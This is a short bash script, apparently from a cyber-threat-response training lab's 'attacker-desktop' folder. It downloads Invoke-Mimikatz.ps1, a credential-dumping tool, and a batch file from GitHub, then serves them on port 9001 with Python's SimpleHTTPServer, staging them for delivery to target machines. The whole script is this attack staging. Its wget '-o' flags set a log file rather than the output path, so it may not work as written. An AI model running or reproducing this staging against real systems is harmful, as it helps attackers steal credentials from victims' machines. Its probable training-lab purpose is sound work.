#!/bin/bash

wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/LIVE/attacker-desktop/Invoke-Mimikatz.ps1 -o /tmp/Invoke-Mimikatz.ps1

wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/LIVE/attacker-desktop/safe.bat -o /tmp/safe.bat

python -m 'SimpleHTTPServer' 9001

